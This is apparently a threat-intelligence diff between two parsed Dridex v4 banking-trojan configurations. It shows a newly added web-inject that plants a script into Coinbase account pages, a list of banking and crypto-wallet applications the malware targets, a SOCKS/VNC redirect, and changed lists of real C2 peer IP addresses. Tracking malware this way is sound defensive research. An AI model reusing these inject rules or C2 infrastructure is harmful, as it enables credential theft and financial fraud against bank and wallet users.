@@ -4,7 +4,7 @@
     ***            dridex v4 configuration                    ***    
     *************************************************************    
     botnetid:      2144    
-    cfg timestamp: 2018-03-14T13:00:10+01:00    
+    cfg timestamp: 2018-03-17T17:00:13+00:00    
     parsed by:     @viql    
         
     note: The dridex v4 config is delivered in binary format;    
@@ -26,17 +26,17 @@
       <sha256>840e204392d2183ec7198917f73c9765f79d4baa0a05721f1d9a41b8670a7608</sha256>
       <sha1>dc8a5f69bc48c4475bc4a44e7eb0fd99a5a7a537</sha1>
       <md5>2680cd66b98910d26bfd815d83ca330f</md5>
-      <timestamp>2017-05-12T21:19:16+02:00</timestamp>
+      <timestamp>2017-05-12T19:19:16+00:00</timestamp>
       <architecture>64</architecture>
       <name>grabber</name>
       <crc>0x4d38f016</crc>
     </module>
   </modules>
   <commands>
-    <cmd id="572377" type="15">
+    <cmd id="217784" type="15">
       <fs>crealogix,multiversa,abacus,ebics,agro-office,cashcomm,softcrew,coconet,macrogram,mammut,omikron,multicash,quatersoft,alphasys,wineur,epsitec,myaccessweb,bellin,financesuite,moneta,softcash,trinity,financesuite,abrantix,starmoney,sfirm,migrosbank,migros bank,online banking,star money,multibit,bitgo,bither,blockchain,copay,msigna,armory,electrum,coinbase,magnr,keepkey,coinsbank,coolwallet,bitoex,xapo,changetip,coinapult,blocktrail,breadwallet,luxstack,airbitz,schildbach,ledger nano,mycelium,trezor,coinomi,bitcore</fs>
     </cmd>
-    <cmd id="572378" type="22">
+    <cmd id="462579" type="22">
       <fs/>
     </cmd>
   </commands>
@@ -205,6 +205,17 @@
           </modify>
         </actions>
       </httpinject>
+      <httpinject label="coinbasecom">
+        <conditions>
+          <url contentType="" modifiers="iU" onget="0" onpost="1" type="allow">^https://(www.)?coinbase\.com/(dashboard|accounts|trade|settings|buy|sell|verifications)</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="i">(&lt;/body&gt;)</pattern>
+            <replacement>\1&lt;script type=&quot;text/javascript&quot; language=&quot;JavaScript&quot; src=&quot;scripts/ember3.js?system=1002&quot;&gt;&lt;/script&gt;</replacement>
+          </modify>
+        </actions>
+      </httpinject>
     </httpinjects>
     <redirects2>
       <redirect name="2nd_t" postfwd="0" socks="1" timeout="30" uri="https://178.62.232.185:443/engagement" vnc="1">msoffice365.js</redirect>
@@ -222,7 +233,7 @@
     </handlers>
     <httpblocks/>
     <clickshots/>
-    <timestamp>2018-03-14T13:00:10+01:00</timestamp>
+    <timestamp>2018-03-17T17:00:13+00:00</timestamp>
   </config>
   <c2>
     <host>
@@ -232,19 +243,15 @@
   </c2>
   <supernodes>
     <node>
-      <ip>139.78.21.232</ip>
-      <port>443</port>
-    </node>
-    <node>
       <ip>81.254.168.177</ip>
       <port>443</port>
     </node>
     <node>
-      <ip>91.189.43.152</ip>
+      <ip>50.251.187.217</ip>
       <port>443</port>
     </node>
     <node>
-      <ip>70.184.66.94</ip>
+      <ip>212.237.42.204</ip>
       <port>443</port>
     </node>
     <node>
@@ -252,8 +259,8 @@
       <port>443</port>
     </node>
     <node>
-      <ip>50.251.187.217</ip>
-      <port>443</port>
+      <ip>37.153.92.6</ip>
+      <port>8443</port>
     </node>
     <node>
       <ip>193.251.189.134</ip>
@@ -264,47 +271,23 @@
       <port>443</port>
     </node>
     <node>
-      <ip>104.34.220.68</ip>
-      <port>443</port>
-    </node>
-    <node>
       <ip>37.153.92.6</ip>
-      <port>8443</port>
-    </node>
-    <node>
-      <ip>212.237.42.204</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>108.205.215.92</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>58.167.83.30</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>98.127.252.183</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>74.66.65.127</ip>
-      <port>443</port>
+      <port>444</port>
     </node>
     <node>
       <ip>73.138.81.95</ip>
       <port>443</port>
     </node>
     <node>
-      <ip>37.153.92.6</ip>
-      <port>444</port>
-    </node>
-    <node>
-      <ip>185.93.183.30</ip>
+      <ip>104.34.220.68</ip>
       <port>443</port>
     </node>
     <node>
-      <ip>185.93.183.30</ip>
+      <ip>71.41.24.246</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>70.184.66.94</ip>
       <port>443</port>
     </node>
   </supernodes>
